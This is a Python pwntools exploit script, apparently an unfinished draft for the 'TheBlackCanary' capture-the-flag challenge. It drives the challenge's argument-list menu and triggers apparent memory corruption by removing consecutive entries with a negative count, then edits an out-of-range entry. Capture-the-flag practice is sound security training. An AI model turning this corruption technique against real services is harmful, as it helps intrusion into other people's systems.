#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from pwn import *
import itertools

IP = "chal.noxale.com"
PORT = 6667

# context.log_level = 'critical'
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
# context(os='linux',arch='amd64')
mode = args['MODE'].lower()
binary = "./TheBlackCanary"

# code = context.binary = ELF(binary)
# if args['LIBDEBUG']:
#     os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
# if args['LIBC']:
#     os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
# libc = code.libc
# libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10
# libc.symbols['one_gadget'] = 0xf1147

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))

def print_list():
    sel("1")
    print io.recvrepeat(timeout=0.5)

def add(content):
    sel(str(2))
    rud("argument:")
    sel(content)

def edit(id, content):
    sel(str(3))
    rud("edit?")
    sel(str(id))
    rud("argument:")
    sel(content)

def remove_one(id):
    sel(str(4))
    rud("2. Remove consecutive arguments")
    sel(str(1))
    rud("remove?")
    sel(str(id))

def remove_some(start, num):
    sel(str(4))
    rud("2. Remove consecutive arguments")
    sel(str(2))
    rud("With which argument would you like to start?")
    sel(str(start))
    rud("How many arguments would you like to remove?")
    sel(str(num))

if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    # io.recvuntil('sha256(xxxx+')
    # suffix = io.recvuntil(')', drop=True)
    # io.recvuntil('== ')
    # hash_str = io.recvline(keepends=False)
    # io.sendline(iters.bruteforce(lambda x: sha256sumhex(
            # x + suffix) == hash_str, string.printable[:62], 4, 'fixed'))
else:
    io = process(binary)
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']


print io.recvline()


gdb.attach(io, ''' 
b *0x00000000004010DF
c
'''
)

add("A"*31)
add("B"*31)
remove_some(0, 2)
# add("C"*31)
# add("D"*31)
# add("E"*31)
# add("F"*31)
# add("G"*31)
# add("H"*28)
# add("I"*24)
# add("J"*20)
remove_some(0, -127)
print_list()
edit(10, "A"*0x10)
# remove_one(4)
print_list()

io.interactive()
